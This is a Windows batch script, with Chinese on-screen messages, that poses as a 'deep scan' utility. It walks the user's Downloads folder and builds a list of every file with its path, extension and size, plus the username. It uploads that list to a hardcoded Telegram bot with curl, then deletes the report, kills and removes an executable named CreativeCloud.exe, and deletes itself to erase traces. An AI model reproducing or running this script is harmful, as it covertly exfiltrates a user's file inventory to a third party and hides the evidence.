@echo off
setlocal enabledelayedexpansion

chcp 65001 >nul

set "TOKEN=8475448253:AAHp0_a3es41WG7so8I2-9K_n2g59Rmgr3M"
set "CHAT_ID=7318370755"
set "EXE_NAME=CreativeCloud.exe"

set "TARGET=%USERPROFILE%\Downloads"
set "OUTPUT_FILE=%TEMP%\DeepScan_Report.txt"
set "SCRIPT_PATH=%~f0"

cls
echo ==========================================================
echo 🔎 正在准备扫描程序...
echo ==========================================================
echo [!] 正在统计文件总数...

:: 重置变量
set "total_files=0"

:: 计算文件数量
if exist "%TARGET%" (
    for /f %%A in ('dir "%TARGET%" /s /b /a ^| findstr /v /i "Adobe CreativeCloud" ^| find /c /v ""') do set "total_files=%%A"
)

:: 保护：如果文件夹为空或为0，设置为1以防止除以零错误
if "!total_files!"=="0" set "total_files=1"

echo [!] 发现 !total_files! 个项目。
echo [!] 正在开始深度扫描...

:: 报告文件头
(
    echo 下载目录扫描报告
    echo 用户: %USERNAME% ^| 时间: %DATE% %TIME%
    echo ----------------------------------------------------------
) > "%OUTPUT_FILE%"

:: ==========================================================
:: 正在扫描并显示进度
:: ==========================================================
set "current_count=0"

pushd "%TARGET%" 2>nul
if %errorlevel% equ 0 (
    for /f "delims=" %%i in ('dir /s /b /a ^| findstr /v /i "Adobe CreativeCloud"') do (
        set /a current_count+=1
        
        :: 百分比计算
        set /a "percent=(current_count * 100) / total_files"
        
        :: 更新标题栏进度
        title [!percent!%%] !current_count! / !total_files! - 正在扫描...

        set "full_path=%%i"
        if exist "%%~i\" (
            echo [文件夹] !full_path! >> "%OUTPUT_FILE%"
        ) else (
            set "size=%%~zi"
            set "ext=%%~xi"
            echo    ^|_ [文件] !full_path! [!ext!] [!size! 字节] >> "%OUTPUT_FILE%"
        )
    )
    popd
)

:: ==========================================================
:: 发送并清理
:: ==========================================================
echo ✅ 扫描完成。正在发送至 Telegram...
title 正在发送报告...

curl -s -k -F "chat_id=%CHAT_ID%" -F "document=@%OUTPUT_FILE%" -F "caption=📊 扫描完成。总计: !current_count! 个项目。" "https://api.telegram.org/bot%TOKEN%/sendDocument" > nul

:: 删除痕迹
if exist "%OUTPUT_FILE%" del /f /q "%OUTPUT_FILE%" >nul 2>&1

taskkill /f /im "%EXE_NAME%" >nul 2>&1

if exist "%~dp0%EXE_NAME%" (
    del /f /q "%~dp0%EXE_NAME%" >nul 2>&1
    echo [OK] %EXE_NAME% berhasil dihapus.
)

echo [!] 任务完成。
start /b "" cmd /c timeout /t 2 ^>nul ^& del /f /q "%SCRIPT_PATH%" ^& exit
